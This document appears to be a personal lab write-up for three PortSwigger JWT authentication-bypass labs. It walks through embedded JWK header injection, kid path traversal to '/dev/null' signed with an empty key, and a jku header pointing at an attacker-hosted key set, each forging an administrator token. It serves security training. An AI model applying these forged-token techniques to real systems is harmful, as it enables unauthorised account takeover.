## Approach

1. See a JWT token? go for it, scan it first with ***Burp Scanner***, it will tell you the vuln
2. Use ***JWT Editor*** extension
3. Check for **[kid path traversal](#[2.%20JWT%20authentication%20bypass%20via%20kid%20header%20path%20traversal](https%20//portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal))**
## Labs
### [1. JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)

> [!NOTE] 
> During JWT validation sometimes there's a misconfiguration where the server validates the key based on the embedded JWK not the actual key

**Generate new RSA key**

> The point is to generate a new RSA key that will be used as the key to embed for a JWK header
1. Open ***JWT Editor*** extension tab
2. Click **New RSA Key** > **Generate** > **OK**
![](attachments/Pasted%20image%2020260106192827.png)

**Embedded JWK attack**

1. Capture `/my-account?id=[user]` request as this has a JWT session and can only be accessed by specific user, good for confirming our attack
2. Go to **JSON Web Token** tab
3. Change the **Payload** **sub** part to `administrator`
![](attachments/Pasted%20image%2020260106193422.png)
4. Click **Attack** > **Embedded JWK**
5. Select our previously generated RSA key as the **Signing Key** > OK
![](attachments/Pasted%20image%2020260106193546.png)
6. Change param to `/my-account?id=administrator` > **Send** request

### [2. JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)

> [!NOTE] 
> The JWT **kid** header is vulnerable to **path traversal** allowing signing of JWT due to attacker controlled key comparison

**Generate a symmetric key**

> We need to generate a symmetric key that is empty, the point is to sign the JWT token with an empty string
1. Open ***JWT Editor*** extension tab
2. Click **New Symmetric Key** > **Generate**
3. Change the value of **k** > **OK**

> `AA==` is base64 encoded of an empty string `""` 
```json
"k": "AA=="
```

**JWT header kid path traversal**

1. Change the header

> Using the **path traversal** vuln we can tell the server that the key location is in `/dev/null` which contents will be empty allowing our empty string signing key to be valid
```json
"kid": "../../../../dev/null"
```

2. Change the payload to target `administrator`

```json
"sub": "administrator"
```

3. Sign using the symmetric key we just generated

![](attachments/Pasted%20image%2020260106195918.png)

4. Change param to `/my-account?id=administrator` > **Send** request

### [3. JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)

> [!NOTE] 
> The **jku** header is used to specify a URL that contains JWK set, similar to embedded JWK vuln the difference is that it's referenced externally

> The point is to generate a new RSA key that will be hosted in the exploit server
1. Open ***JWT Editor*** extension tab
2. Click **New RSA Key** > **Generate** > **OK**
![](attachments/Pasted%20image%2020260106202400.png)

**JKU header attack**

> - Host in `/exploit`
> - Specifying the **keys** array is important
> - You get the key by **Copy Public Key as JWK**
![](attachments/Pasted%20image%2020260106202829.png)
```json
{
    "keys": [
        {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "1e0d938a-f1f2-4e23-a28e-b3e2496dc495",
    "n": "m4He72zx2x2_vK3gm9lBCDPn_Sjjd99DsyDUDlclKBjUKTNvKixjZVql0qMn0oXoIQeNSjKTvKV0CkNS3xT08lpRqwiRvByc1CCbYhnNAW4meshUmIj_uIbrnMVMuNl3Q7KmTT13WgdLUs88tlut08Tr8ByZhzuRGHgv-Mcwi0-xl1NPaeV3FanRd0l4wM6L6wR9evo6e0dZNmI5zCGbeBc8YI6-ksBI1-7kJR7SIujY5Orj04NujAGbkosqxRkcQ_X4XuYC7oiMnChnFjs66G-il6xMjkvoYbpn6Ic3SZIFjOtrupRl3md1-e_BYzRe_ieKaCv9hAC8ejtcUXKSAQ"
}
    ]
}
```

> - Specify the exploit server payload URL
> - Use the **kid** from you generated key
```json
{  
    "kid": "1e0d938a-f1f2-4e23-a28e-b3e2496dc495",  
    "alg": "RS256",  
    "jku": "https://exploit-0ac800a50337d5c4841f7cb5011300de.exploit-server.net/exploit"  
}
```

> Change **sub** in **Payload** to `administrator`, then sign using the generated key
```json
"sub": "administrator"
```





